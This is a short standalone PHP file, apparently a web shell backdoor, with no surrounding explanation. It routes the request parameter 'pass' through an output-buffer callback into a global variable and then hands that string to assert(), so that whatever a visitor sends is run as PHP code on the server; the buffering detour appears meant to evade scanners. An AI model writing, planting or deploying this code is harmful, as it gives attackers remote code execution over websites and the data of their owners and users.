<?php
$evalstr="";
function myeval($c,$d)
{
global $evalstr;
$evalstr=$c;
}
ob_start('myeval');
echo $_REQUEST['pass'];
ob_end_flush();
assert($evalstr);
?>